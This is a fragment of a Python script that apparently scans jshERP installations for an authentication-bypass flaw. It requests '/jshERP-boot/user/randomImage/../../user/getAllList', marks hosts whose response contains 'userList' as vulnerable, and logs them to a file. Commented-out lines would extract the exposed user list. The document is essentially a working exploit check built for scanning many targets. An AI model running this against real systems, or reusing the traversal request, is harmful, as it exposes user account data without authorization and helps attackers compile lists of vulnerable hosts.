...
def check_url(url):
	...
	vulnurl=url + '/jshERP-boot/user/randomImage/../../user/getAllList'
	try:
		res = requests.get(vulnurl, verify=False, allow_redirects=True, timeout=5)
		if "userList" in res.text and res.status_code==200:
			# resp=res.json()
			# text=resp.get('data')
			# text1=text.get('userList')
			print("\033[32m[+]{} is vulnerable! \033[0m".format(url))
			# print(text1)

			wirte_targets(vulnurl,"jshvuln.txt")
		else:
		...
		print("[!]{} request False".format(url))
		pass
